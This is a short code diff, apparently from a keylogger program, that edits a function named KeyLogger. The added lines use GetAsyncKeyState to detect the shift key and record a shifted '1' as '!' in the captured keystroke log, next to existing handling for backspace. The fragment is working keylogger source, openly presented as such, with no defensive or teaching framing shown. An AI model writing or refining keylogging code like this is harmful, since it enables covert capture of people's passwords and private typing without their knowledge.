@@ -44,6 +44,17 @@ void KeyLogger(void)
                     write << character;
                 }
 
+                // Shift keys 
+
+                switch (character){
+                    case 49:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "!";
+                        }else {write << character;}
+                        break;
+                    }
+                }
+
                 switch (character)
                 {
                     case 8: // 8 means backspace.
